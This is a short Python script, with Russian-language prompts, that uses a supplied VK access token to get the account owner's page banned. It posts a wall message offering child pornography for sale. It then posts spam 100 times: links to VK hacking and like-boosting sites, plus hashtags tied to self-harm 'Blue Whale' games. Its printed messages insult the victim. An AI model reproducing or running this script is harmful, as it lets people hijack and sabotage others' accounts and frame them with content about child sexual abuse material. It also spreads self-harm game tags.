# -*- coding: utf-8 -*-
import vk_api
import time
from vk_api.longpoll import VkLongPoll, VkEventType
print(f'By Yakima Visus \n Бан страницы ВКонтакте через токен веростность бана 100%')
token = input("Токен вк: ")

vk_session = vk_api.VkApi(token=token)
vk = vk_session.get_api()
longpoll = VkLongPoll(vk_session,id)

vk.wall.post(message="Продам детское порно")
for i in range(100):
	try:
		vk.wall.post(message='vto.pe vkbot.ru olike.ru vkscripts.ru vkkrutilka.ru freelikes.online vlike.ru vk.io vzlomvk.social vkrutilka.ru vk.me vzlomvk.pro vzlomvk.co vzlom-vk.cc vkboost.com oliker.ru bosslike.ru vktarget.ru vkmix.com vk.com https://www.vzlomvk.org/?hash=Ge57gP8D https://vto.pe lolz.guru/threads/130970/ lolz.guru www.vzlomvk.org https://vk-ban-2253c7a0.xxhax.com/ www.vto.pe https://vk.io https://trashbox.ru/link/vk-me-android #сованикогданеспит #синийкит #тихийлес #явигре #примивигру')
		time.sleep(0.5)
		print("[*] Начинантся блокировка питуха")
	except Exception as ban:
		print("[*] Ожидаем бан лошка...")